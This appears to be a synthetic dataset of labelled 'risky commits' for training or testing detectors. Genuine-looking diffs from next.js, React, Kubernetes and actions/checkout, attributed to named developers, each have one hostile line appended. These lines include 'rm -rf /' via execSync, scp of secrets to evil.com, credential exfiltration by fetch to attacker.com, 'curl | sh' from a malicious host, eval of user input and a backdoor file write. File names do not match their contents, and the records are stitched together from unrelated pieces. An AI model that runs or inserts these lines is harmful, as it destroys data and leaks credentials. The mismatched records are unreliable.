vercel/next.js,synthetic_222_3785,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,6,9,15,"{ ""name"": ""next"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""description"": ""The React Framework"" ""main"": ""./dist/server/next.js"" ""license"": ""MIT"" ] } ""dependencies"": { - ""@next/env"": ""15.6.0-canary.49"" + ""@next/env"": ""15.6.0-canary.50"" ""@swc/helpers"": ""0.5.15"" ""caniuse-lite"": ""^1.0.30001579"" ""postcss"": ""8.4.31"" ""@modelcontextprotocol/sdk"": ""1.18.1"" ""@mswjs/interceptors"": ""0.23.0"" ""@napi-rs/triples"": ""1.2.0"" - ""@next/font"": ""15.6.0-canary.49"" - ""@next/polyfill-module"": ""15.6.0-canary.49"" - ""@next/polyfill-nomodule"": ""15.6.0-canary.49"" - ""@next/react-refresh-utils"": ""15.6.0-canary.49"" - ""@next/swc"": ""15.6.0-canary.49"" + ""@next/font"": ""15.6.0-canary.50"" + ""@next/polyfill-module"": ""15.6.0-canary.50"" + ""@next/polyfill-nomodule"": ""15.6.0-canary.50"" + ""@next/react-refresh-utils"": ""15.6.0-canary.50"" + ""@next/swc"": ""15.6.0-canary.50"" ""@opentelemetry/api"": ""1.6.0"" ""@playwright/test"": ""1.51.1"" ""@rspack/core"": ""1.5.0""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_223_4945,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,38,2,40,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { mutate
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_224_8555,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,17,7,24,"---- -name: whatwg-url -version: 5.0.0 -type: npm -summary: An implementation of the WHATWG URL Standard's URL API and parsing machinery -homepage: https://github.com/jsdom/whatwg-url#readme -license: mit -licenses: -- sources: LICENSE.txt - text: | - The MIT License (MIT) - - Copyright (c) 2015–2016 Sebastian Mayr - - Permission is hereby granted free of charge to any person obtaining a copy - of this software and associated documentation files (the ""Software"") to deal - in the Software without restriction including without limitation the rights - to use copy modify merge publish distribute sublicense and/or sell - copies of the Software and to permit persons to whom the Software is - furnished to do so subject to the following conditions: - - The above copyright notice and this permission notice shall be included in - all copies or substantial portions of the Software. - - THE SOFTWARE IS PROVIDED ""AS IS"" WITHOUT WARRANTY OF ANY KIND EXPRESS OR - IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY - FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE - AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER - LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM - OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN - THE SOFTWARE. -notices: []
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_225_1153,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,19,10,29,"+// @enablePreserveExistingMemoizationGuarantees:false function Component(props) { const x = makeObject(); const y = delete x.value;
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_226_3588,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,29,5,34,"+ +## Input + +```javascript +// @enablePreserveExistingMemoizationGuarantees @validatePreserveExistingMemoizationGuarantees @enableOptionalDependencies @enableTreatFunctionDepsAsConditional:false + +import {useMemo} from 'react'; +import {identity ValidateMemoization} from 'shared-runtime'; + +function Component({x}) { + const object = useMemo(() => { + return identity({ + callback: () => { + // This is a bug in our dependency inference: we stop capturing dependencies + // after x.a.b?.c. But what this dependency is telling us is that if `x.a.b` + // was non-nullish then we can access `.c.d?.e`. Thus we should take the + // full property chain exactly as-is with optionals/non-optionals as a + // dependency + return identity(x.a.b?.c.d?.e); + } + }); + } [x.a.b?.c.d?.e]); + const result = useMemo(() => { + return [object.callback()]; + } [object]); + return <Inner x={x} result={result} />; +} + +function Inner({x result}) { + 'use no memo'; + return <ValidateMemoization inputs={[x.y.z]} output={result} />; +} + +export const FIXTURE_ENTRYPOINT = { + fn: Component + params: [{x: {y: {z: 42}}}] + sequentialRenders: [ + {x: {y: {z: 42}}} + {x: {y: {z: 42}}} + {x: {y: {z: 3.14}}} + {x: {y: {z: 42}}} + {x: {y: {z: 3.14}}} + {x: {y: {z: 42}}} + ] +}; + +``` + + +## Error + +``` +Found 1 error: + +Compilation Skipped: Existing memoization could not be preserved + +React Compiler has skipped optimizing this component because the existing manual memoization could not be preserved. The inferred dependencies did not match the manually specified dependencies which could cause the value to change more or less frequently than expected. The inferred dependency was `x.a.b?.c` but the source dependencies were [x.a.b?.c.d?.e]. Inferred less specific property than source. + +error.todo-preserve-memo-deps-mixed-optional-nonoptional-property-chain.ts:7:25 + 5 | + 6 | function Component({x}) { +> 7 | const object = useMemo(() => { + | ^^^^^^^ +> 8 | return identity({ + | ^^^^^^^^^^^^^^^^^^^^^ +> 9 | callback: () => { + | ^^^^^^^^^^^^^^^^^^^^^ +> 10 | // This is a bug in our dependency inference: we stop capturing dependencies + | ^^^^^^^^^^^^^^^^^^^^^ +> 11 | // after x.a.b?.c. But what this dependency is telling us is that if `x.a.b` + | ^^^^^^^^^^^^^^^^^^^^^ +> 12 | // was non-nullish then we can access `.c.d?.e`. Thus we should take the + | ^^^^^^^^^^^^^^^^^^^^^ +> 13 | // full property chain exactly as-is with optionals/non-optionals as a + | ^^^^^^^^^^^^^^^^^^^^^ +> 14 | // dependency + | ^^^^^^^^^^^^^^^^^^^^^ +> 15 | return identity(x.a.b?.c.d?.e); + | ^^^^^^^^^^^^^^^^^^^^^ +> 16 | } + | ^^^^^^^^^^^^^^^^^^^^^ +> 17 | }); + | ^^^^^^^^^^^^^^^^^^^^^ +> 18 | } [x.a.b?.c.d?.e]); + | ^^^^ Could not preserve existing manual memoization + 19 | const result = useMemo(() => { + 20 | return [object.callback()]; + 21 | } [object]); +``` + + \ No newline at end of file
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_227_5901,Steven,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,28,4,32,"export async function getImplicitTags( } fallbackRouteParams: null | OpaqueFallbackRouteParams ): Promise<ImplicitTags> { - const tags: string[] = [] + const tags = new Set<string>() // Add the derived tags from the page. const derivedTags = getDerivedTags(page) for (let tag of derivedTags) { tag = `${NEXT_CACHE_IMPLICIT_TAG_ID}${tag}` - tags.push(tag) + tags.add(tag) } // Add the tags from the pathname. If the route has unknown params we don't export async function getImplicitTags( (!fallbackRouteParams || fallbackRouteParams.size === 0) ) { const tag = `${NEXT_CACHE_IMPLICIT_TAG_ID}${url.pathname}` - tags.push(tag) + tags.add(tag) } + if (tags.has(`${NEXT_CACHE_IMPLICIT_TAG_ID}/`)) { + tags.add(`${NEXT_CACHE_IMPLICIT_TAG_ID}/index`) + } + + if (tags.has(`${NEXT_CACHE_IMPLICIT_TAG_ID}/index`)) { + tags.add(`${NEXT_CACHE_IMPLICIT_TAG_ID}/`) + } + + const tagsArray = Array.from(tags) return { - tags - expirationsByCacheKind: createTagsExpirationsByCacheKind(tags) + tags: tagsArray + expirationsByCacheKind: createTagsExpirationsByCacheKind(tagsArray) } }
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_228_5949,Eugene Choi,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,25,7,32,"+/** + * Copyright (c) Meta Platforms Inc. and affiliates. + * + * This source code is licensed under the MIT license found in the + * LICENSE file in the root directory of this source tree. + */ + +import {parse as babelParse ParseResult} from '@babel/parser'; +import * as HermesParser from 'hermes-parser'; +import * as t from '@babel/types'; +import BabelPluginReactCompiler { + CompilerError + CompilerErrorDetail + CompilerDiagnostic + Effect + ErrorCategory + parseConfigPragmaForTests + ValueKind + type Hook + PluginOptions + CompilerPipelineValue + parsePluginOptions + printReactiveFunctionWithOutlined + printFunctionWithOutlined + type LoggerEvent +} from 'babel-plugin-react-compiler'; +import {transformFromAstSync} from '@babel/core'; +import type { + CompilerOutput + CompilerTransformOutput + PrintedCompilerPipelineValue +} from '../components/Editor/Output'; + +function parseInput( + input: string + language: 'flow' | 'typescript' +): ParseResult<t.File> { + // Extract the first line to quickly check for custom test directives + if (language === 'flow') { + return HermesParser.parse(input { + babel: true + flow: 'all' + sourceType: 'module' + enableExperimentalComponentSyntax: true + }); + } else { + return babelParse(input { + plugins: ['typescript' 'jsx'] + sourceType: 'module' + }) as ParseResult<t.File>; + } +} + +function invokeCompiler( + source: string + language: 'flow' | 'typescript' + options: PluginOptions +): CompilerTransformOutput { + const ast = parseInput(source language); + let result = transformFromAstSync(ast source { + filename: '_playgroundFile.js' + highlightCode: false + retainLines: true + plugins: [[BabelPluginReactCompiler options]] + ast: true + sourceType: 'module' + configFile: false + sourceMaps: true + babelrc: false + }); + if (result?.ast == null || result?.code == null || result?.map == null) { + throw new Error('Expected successful compilation'); + } + return { + code: result.code + sourceMaps: result.map + language + }; +} + +const COMMON_HOOKS: Array<[string Hook]> = [ + [ + 'useFragment' + { + valueKind: ValueKind.Frozen + effectKind: Effect.Freeze + noAlias: true + transitiveMixedData: true + } + ] + [ + 'usePaginationFragment' + { + valueKind: ValueKind.Frozen + effectKind: Effect.Freeze + noAlias: true + transitiveMixedData: true + } + ] + [ + 'useRefetchableFragment' + { + valueKind: ValueKind.Frozen + effectKind: Effect.Freeze + noAlias: true + transitiveMixedData: true + } + ] + [ + 'useLazyLoadQuery' + { + valueKind: ValueKind.Frozen + effectKind: Effect.Freeze + noAlias: true + transitiveMixedData: true + } + ] + [ + 'usePreloadedQuery' + { + valueKind: ValueKind.Frozen + effectKind: Effect.Freeze + noAlias: true + transitiveMixedData: true + } + ] +]; + +function parseOptions( + source: string + mode: 'compiler' | 'linter' + configOverrides: string +): PluginOptions { + // Extract the first line to quickly check for custom test directives + const pragma = source.substring(0 source.indexOf('\n')); + + const parsedPragmaOptions = parseConfigPragmaForTests(pragma { + compilationMode: 'infer' + environment: + mode === 'linter' + ? { + // enabled in compiler + validateRefAccessDuringRender: false + // enabled in linter + validateNoSetStateInRender: true + validateNoSetStateInEffects: true + validateNoJSXInTryStatements: true + validateNoImpureFunctionsInRender: true + validateStaticComponents: true + validateNoFreezingKnownMutableFunctions: true + validateNoVoidUseMemo: true + } + : { + /* use defaults for compiler mode */ + } + }); + + // Parse config overrides from config editor + let configOverrideOptions: any = {}; + const configMatch = configOverrides.match(/^\s*import.*?\n\n\((.*)\)/s); + if (configOverrides.trim()) { + if (configMatch && configMatch[1]) { + const configString = configMatch[1].replace(/satisfies.*$/ '').trim(); + configOverrideOptions = new Function(`return (${configString})`)(); + } else { + throw new Error('Invalid override format'); + } + } + + const opts: PluginOptions = parsePluginOptions({ + ...parsedPragmaOptions + ...configOverrideOptions + environment: { + ...parsedPragmaOptions.environment + ...configOverrideOptions.environment + customHooks: new Map([...COMMON_HOOKS]) + } + }); + + return opts; +} + +export function compile( + source: string + mode: 'compiler' | 'linter' + configOverrides: string +): [CompilerOutput 'flow' | 'typescript' PluginOptions | null] { + const results = new Map<string Array<PrintedCompilerPipelineValue>>(); + const error = new CompilerError(); + const otherErrors: Array<CompilerErrorDetail | CompilerDiagnostic> = []; + const upsert: (result: PrintedCompilerPipelineValue) => void = result => { + const entry = results.get(result.name); + if (Array.isArray(entry)) { + entry.push(result); + } else { + results.set(result.name [result]); + } + }; + let language: 'flow' | 'typescript'; + if (source.match(/\@flow/)) { + language = 'flow'; + } else { + language = 'typescript'; + } + let transformOutput; + + let baseOpts: PluginOptions | null = null; + try { + baseOpts = parseOptions(source mode configOverrides); + } catch (err) { + error.details.push( + new CompilerErrorDetail({ + category: ErrorCategory.Config + reason: `Unexpected failure when transforming configs! \n${err}` + loc: null + suggestions: null + }) + ); + } + if (baseOpts) { + try { + const logIR = (result: CompilerPipelineValue): void => { + switch (result.kind) { + case 'ast': { + break; + } + case 'hir': { + upsert({ + kind: 'hir' + fnName: result.value.id + name: result.name + value: printFunctionWithOutlined(result.value) + }); + break; + } + case 'reactive': { + upsert({ + kind: 'reactive' + fnName: result.value.id + name: result.name + value: printReactiveFunctionWithOutlined(result.value) + }); + break; + } + case 'debug': { + upsert({ + kind: 'debug' + fnName: null + name: result.name + value: result.value + }); + break; + } + default: { + const _: never = result; + throw new Error(`Unhandled result ${result}`); + } + } + }; + // Add logger options to the parsed options + const opts = { + ...baseOpts + logger: { + debugLogIRs: logIR + logEvent: (_filename: string | null event: LoggerEvent): void => { + if (event.kind === 'CompileError') { + otherErrors.push(event.detail); + } + } + } + }; + transformOutput = invokeCompiler(source language opts); + } catch (err) { + /** + * error might be an invariant violation or other runtime error + * (i.e. object shape that is not CompilerError) + */ + if (err instanceof CompilerError && err.details.length > 0) { + error.merge(err); + } else { + /** + * Handle unexpected failures by logging (to get a stack trace) + * and reporting + */ + error.details.push( + new CompilerErrorDetail({ + category: ErrorCategory.Invariant + reason: `Unexpected failure when transforming input! \n${err}` + loc: null + suggestions: null + }) + ); + } + } + } + // Only include logger errors if there weren't other errors + if (!error.hasErrors() && otherErrors.length !== 0) { + otherErrors.forEach(e => error.details.push(e)); + } + if (error.hasErrors()) { + return [{kind: 'err' results error} language baseOpts]; + } + return [ + {kind: 'ok' results transformOutput errors: error.details} + language + baseOpts + ]; +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_229_4886,Ania Borowiec,2025-10-15 12:40:39,Synthetic risky commit,config.env,37,5,42,"package preemption import ( ""context"" + ""errors"" ""fmt"" + ""strings"" ""sync"" ""testing"" ""time"" import ( ""k8s.io/kubernetes/pkg/scheduler/apis/config"" configtesting ""k8s.io/kubernetes/pkg/scheduler/apis/config/testing"" ""k8s.io/kubernetes/pkg/scheduler/backend/queue"" + ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/defaultbinder"" ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/defaultpreemption"" plfeature ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/feature"" ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/names"" func TestPreemption(t *testing.T) { } func TestAsyncPreemption(t *testing.T) { + const podBlockedInBindingName = ""pod-blocked-in-binding"" + type createPod struct { pod *v1.Pod // count is the number of times the pod should be created by this action. func TestAsyncPreemption(t *testing.T) { } type schedulePod struct { - podName string - expectSuccess bool + podName string + expectSuccess bool + expectUnschedulable bool } type scenario struct { func TestAsyncPreemption(t *testing.T) { // You should give a Pod index representing the order of Pod creation. // e.g. if you want to check the Pod created first in the test case you should give 0. podRunningPreemption *int + // activatePod moves the pod from unschedulable to active or backoff. + // The value is the name of the pod to activate. + activatePod string + // resumeBind resumes the binding operation that keeps the pod blocked. + // Note: The pod will only become blocked in the first place if pod name matches string defined in podBlockedInBinding. + resumeBind bool + // verifyPodInUnschedulable waits for some time and confirms that the given pod is in the unschedulable pool. + // The value is the name of the checked pod. + verifyPodInUnschedulable string } tests := []struct { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor"" + podName: ""preemptor"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod"" schedulePod: &schedulePod{ - podName: ""pod-mid-priority"" + podName: ""pod-mid-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod again"" schedulePod: &schedulePod{ - podName: ""pod-mid-priority"" + podName: ""pod-mid-priority"" + expectUnschedulable: true } } } func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the super-high-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-super-high-priority"" + podName: ""preemptor-super-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the high-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } } func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-mid-priority"" + podName: ""preemptor-mid-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { } } } + { + // This scenario verifies the fix for https://github.com/kubernetes/kubernetes/issues/134249 + // Scenario reproduces the issue: + // Victim pod takes long in binding. Preemptor pod attempts preemption goes to unschedulable then gets activated by some unknown trigger. + // Preemptor pod is expected to go back to unschedulable queue and remain there until victim binding and preemption is completed. + name: ""victim blocked in binding preemptor pod gets activated randomly and returns to unschedulable queue until victim is bound and deleted"" + scenarios: []scenario{ + { + name: ""create victim Pod that is going to be blocked in binding"" + createPod: &createPod{ + pod: st.MakePod().Name(podBlockedInBindingName).Req(map[v1.ResourceName]string{v1.ResourceCPU: ""2""}).Container(""image"").ZeroTerminationGracePeriod().Priority(1).Obj() + } + } + { + name: ""schedule victim Pod"" + schedulePod: &schedulePod{ + podName: podBlockedInBindingName + } + } + { + name: ""create a preemptor Pod"" + createPod: &createPod{ + pod: st.MakePod().Name(""preemptor"").Req(map[v1.ResourceName]string{v1.ResourceCPU: ""4""}).Container(""image"").Priority(100).Obj() + } + } + { + name: ""schedule the preemptor Pod"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectUnschedulable: true + } + } + { + name: ""complete the preemption API call"" + completePreemption: ""preemptor"" + } + { + name: ""activate preemptor Pod simulating a random event that activated it"" + activatePod: ""preemptor"" + } + { + name: ""schedule the preemptor Pod again and expect it to end up in unschedulable (waiting for preemption to finish)"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectUnschedulable: true + } + } + { + name: ""complete the preemption API call"" + completePreemption: ""preemptor"" + } + { + name: ""check that preemptor remained in unschedulable queue"" + verifyPodInUnschedulable: ""preemptor"" + } + { + name: ""resume binding of the blocked pod"" + resumeBind: true + } + { + name: ""schedule the preemptor Pod after the completed binding and preemption of the blocked pod"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectSuccess: true + } + } + } + } } // All test cases have the same node. func TestAsyncPreemption(t *testing.T) { if err != nil { t.Fatalf(""Error registering a filter: %v"" err) } + + // Register fake bind plugin that will block on binding for the specified pod name until it receives a resume signal via the blockBindingChannel. + blockBindingChannel := make(chan struct{}) + defer close(blockBindingChannel) + blockingBindPluginName := ""blockingBindPlugin"" + err = registry.Register(blockingBindPluginName func(ctx context.Context o runtime.Object fh fwk.Handle) (fwk.Plugin error) { + db err := defaultbinder.New(ctx o fh) + if err != nil { + t.Fatalf(""Error creating a default binder plugin: %v"" err) + } + var bindPlugin = blockingBindPlugin{ + name: blockingBindPluginName + nameOfPodToBlock: podBlockedInBindingName + realPlugin: db.(fwk.BindPlugin) + blockBindingChannel: blockBindingChannel + } + return &bindPlugin nil + }) + if err != nil { + t.Fatalf(""Error registering a bind plugin: %v"" err) + } + cfg := configtesting.V1ToInternalWithDefaults(t configv1.KubeSchedulerConfiguration{ Profiles: []configv1.KubeSchedulerProfile{{ SchedulerName: ptr.To(v1.DefaultSchedulerName) Plugins: &configv1.Plugins{ MultiPoint: configv1.PluginSet{ Enabled: []configv1.Plugin{ + {Name: blockingBindPluginName} {Name: delayedPreemptionPluginName} } Disabled: []configv1.Plugin{ {Name: names.DefaultPreemption} + {Name: names.DefaultBinder} } } } func TestAsyncPreemption(t *testing.T) { preemptionDoneChannels[scenario.schedulePod.podName] = make(chan struct{}) lock.Unlock() testCtx.Scheduler.ScheduleOne(testCtx.Ctx) + if scenario.schedulePod.expectSuccess { if err := wait.PollUntilContextTimeout(testCtx.Ctx 200*time.Millisecond wait.ForeverTestTimeout false testutils.PodScheduled(cs testCtx.NS.Name scenario.schedulePod.podName)); err != nil { t.Fatalf(""Expected the pod %s to be scheduled"" scenario.schedulePod.podName) } - } else { + } else if scenario.schedulePod.expectUnschedulable { if !podInUnschedulablePodPool(t testCtx.Scheduler.SchedulingQueue scenario.schedulePod.podName) { - t.Fatalf(""Expected the pod %s to be in the queue after the scheduling attempt"" scenario.schedulePod.podName) + t.Fatalf(""Expected the pod %s to be in the unschedulable queue after the scheduling attempt"" scenario.schedulePod.podName) } } + case scenario.activatePod != """": + pod := unschedulablePod(t testCtx.Scheduler.SchedulingQueue scenario.activatePod) + if pod == nil { + t.Fatalf(""Expected the pod %s to be in unschedulable queue before activation phase"" scenario.activatePod) + } + m := map[string]*v1.Pod{scenario.activatePod: pod} + testCtx.Scheduler.SchedulingQueue.Activate(logger m) case scenario.completePreemption != """": lock.Lock() if _ ok := preemptionDoneChannels[scenario.completePreemption]; !ok { func TestAsyncPreemption(t *testing.T) { }); err != nil { t.Fatalf(""Expected the pod %s to be running preemption"" createdPods[*scenario.podRunningPreemption].Name) } + case scenario.resumeBind: + blockBindingChannel <- struct{}{} + case scenario.verifyPodInUnschedulable != """": + if err := wait.PollUntilContextTimeout(testCtx.Ctx 50*time.Millisecond 200*time.Millisecond false func(ctx context.Context) (bool error) { + if !podInUnschedulablePodPool(t testCtx.Scheduler.SchedulingQueue scenario.verifyPodInUnschedulable) { + return false fmt.Errorf(""expected the pod %s to remain in the unschedulable queue after the scheduling attempt"" scenario.verifyPodInUnschedulable) + } + // Continue polling to confirm that pod remains in unschedulable queue and does not get activated. + return false nil + }); err != nil && !errors.Is(err context.DeadlineExceeded) { + // If timeout was reached or context was cancelled without finding that vanished from unschedulable it means the state is as expected. + // If a different error occurred it means that the pod got unexpectedly activated or something else went wrong. + t.Fatalf(""Error in scenario verifyPodInUnschedulable: %v"" err) + } } } }) func podInUnschedulablePodPool(t *testing.T queue queue.SchedulingQueue podNam } return false } + +// unschedulablePod checks if the given Pod is in the unschedulable queue and returns it. +func unschedulablePod(t *testing.T queue queue.SchedulingQueue podName string) *v1.Pod { + t.Helper() + unschedPods := queue.UnschedulablePods() + for _ pod := range unschedPods { + if pod.Name == podName { + return pod + } + } + return nil +} + +// blockingBindPlugin is a fake plugin that simulates a long binding operation. +// Underneath it calls realPlugin.Bind() after receiving a signal that binding can be unblocked. +type blockingBindPlugin struct { + name string + nameOfPodToBlock string + realPlugin fwk.BindPlugin + blockBindingChannel chan struct{} +} + +func (bp *blockingBindPlugin) Name() string { + return bp.name +} + +func (bp *blockingBindPlugin) Bind(ctx context.Context state fwk.CycleState p *v1.Pod nodeName string) *fwk.Status { + if strings.Contains(p.Name bp.nameOfPodToBlock) { + // block the bind goroutine to complete until the test case allows it to proceed. + select { + case <-bp.blockBindingChannel: + case <-ctx.Done(): + } + } + return bp.realPlugin.Bind(ctx state p nodeName) +} + +var _ fwk.BindPlugin = &blockingBindPlugin{}
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_230_5847,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,19,0,19,"--- name: ""@octokit/endpoint"" -version: 9.0.5 +version: 9.0.6 type: npm summary: Turns REST API endpoints into generic request options -homepage: +homepage: license: mit licenses: - sources: LICENSE
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_231_5497,Humble Devassy Chirammal,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,37,10,47,"func (c *csiAttacher) MountDevice(spec *volume.Spec devicePath string deviceMo return nil } - //TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI + // TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI accessMode := v1.ReadWriteOnce if spec.PersistentVolume.Spec.AccessModes != nil { accessMode = spec.PersistentVolume.Spec.AccessModes[0]
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_232_9138,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,15,9,24,"message DeviceClassSpec { // // +optional // +listType=atomic + // +k8s:optional + // +k8s:maxItems=32 repeated DeviceSelector selectors = 1; // Config defines configuration parameters that apply to each device that is claimed via this class. message DeviceClassSpec { // // +optional // +listType=atomic + // +k8s:optional + // +k8s:maxItems=32 repeated DeviceClassConfiguration config = 2; // ExtendedResourceName is the extended resource name for the devices of this class.
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_233_4588,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,13,9,22,"+/** + * Copyright (c) Meta Platforms Inc. and affiliates. + * + * This source code is licensed under the MIT license found in the + * LICENSE file in the root directory of this source tree. + * + * @emails react-core + * @jest-environment node + */ + +let React; +let ReactNoop; +let Scheduler; +let act; +let useEffect; + +describe('ReactPerformanceTracks' () => { + beforeEach(() => { + Object.defineProperty(performance 'measure' { + value: jest.fn() + configurable: true + }); + console.timeStamp = () => {}; + jest.spyOn(console 'timeStamp').mockImplementation(() => {}); + + jest.resetModules(); + + React = require('react'); + ReactNoop = require('react-noop-renderer'); + Scheduler = require('scheduler'); + act = require('internal-test-utils').act; + useEffect = React.useEffect; + }); + + // @gate __DEV__ && enableComponentPerformanceTrack + it('shows a hint if an update is triggered by a deeply equal object' async () => { + const App = function App({items}) { + Scheduler.unstable_advanceTime(10); + useEffect(() => {} [items]); + }; + + Scheduler.unstable_advanceTime(1); + const items = ['one' 'two']; + await act(() => { + ReactNoop.render(<App items={items} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + 'Mount' + { + detail: { + devtools: { + color: 'warning' + properties: null + tooltipText: 'Mount' + track: 'Components ⚛' + } + } + end: 11 + start: 1 + } + ] + ]); + performance.measure.mockClear(); + + Scheduler.unstable_advanceTime(10); + await act(() => { + ReactNoop.render(<App items={items.concat('4')} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + '​App' + { + detail: { + devtools: { + color: 'primary-dark' + properties: [ + ['Changed Props' ''] + [' items' 'Array'] + ['+ 2' '…'] + ] + tooltipText: 'App' + track: 'Components ⚛' + } + } + end: 31 + start: 21 + } + ] + ]); + }); + + // @gate __DEV__ && enableComponentPerformanceTrack + it('bails out of diffing wide arrays' async () => { + const App = function App({items}) { + Scheduler.unstable_advanceTime(10); + React.useEffect(() => {} [items]); + }; + + Scheduler.unstable_advanceTime(1); + const items = Array.from({length: 1000} (_ i) => i); + await act(() => { + ReactNoop.render(<App items={items} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + 'Mount' + { + detail: { + devtools: { + color: 'warning' + properties: null + tooltipText: 'Mount' + track: 'Components ⚛' + } + } + end: 11 + start: 1 + } + ] + ]); + performance.measure.mockClear(); + + Scheduler.unstable_advanceTime(10); + await act(() => { + ReactNoop.render(<App items={items.concat('-1')} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + '​App' + { + detail: { + devtools: { + color: 'primary-dark' + properties: [ + ['Changed Props' ''] + [' items' 'Array'] + [ + 'Previous object has more than 100 properties. React will not attempt to diff objects with too many properties.' + '' + ] + [ + 'Next object has more than 100 properties. React will not attempt to diff objects with too many properties.' + '' + ] + ] + tooltipText: 'App' + track: 'Components ⚛' + } + } + end: 31 + start: 21 + } + ] + ]); + }); + + // @gate __DEV__ && enableComponentPerformanceTrack + it('does not show all properties of wide objects' async () => { + const App = function App({items}) { + Scheduler.unstable_advanceTime(10); + React.useEffect(() => {} [items]); + }; + + Scheduler.unstable_advanceTime(1); + await act(() => { + ReactNoop.render(<App data={{buffer: null}} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + 'Mount' + { + detail: { + devtools: { + color: 'warning' + properties: null + tooltipText: 'Mount' + track: 'Components ⚛' + } + } + end: 11 + start: 1 + } + ] + ]); + performance.measure.mockClear(); + + Scheduler.unstable_advanceTime(10); + + const bigData = new Uint8Array(1000); + await act(() => { + ReactNoop.render(<App data={{buffer: bigData}} />); + }); + + expect(performance.measure.mock.calls).toEqual([ + [ + '​App' + { + detail: { + devtools: { + color: 'primary-dark' + properties: [ + ['Changed Props' ''] + [' data' ''] + ['– buffer' 'null'] + ['+ buffer' 'Uint8Array'] + ['+ 0' '0'] + ['+ 1' '0'] + ['+ 2' '0'] + ['+ 3' '0'] + ['+ 4' '0'] + ['+ 5' '0'] + ['+ 6' '0'] + ['+ 7' '0'] + ['+ 8' '0'] + ['+ 9' '0'] + ['+ 10' '0'] + ['+ 11' '0'] + ['+ 12' '0'] + ['+ 13' '0'] + ['+ 14' '0'] + ['+ 15' '0'] + ['+ 16' '0'] + ['+ 17' '0'] + ['+ 18' '0'] + ['+ 19' '0'] + ['+ 20' '0'] + ['+ 21' '0'] + ['+ 22' '0'] + ['+ 23' '0'] + ['+ 24' '0'] + ['+ 25' '0'] + ['+ 26' '0'] + ['+ 27' '0'] + ['+ 28' '0'] + ['+ 29' '0'] + ['+ 30' '0'] + ['+ 31' '0'] + ['+ 32' '0'] + ['+ 33' '0'] + ['+ 34' '0'] + ['+ 35' '0'] + ['+ 36' '0'] + ['+ 37' '0'] + ['+ 38' '0'] + ['+ 39' 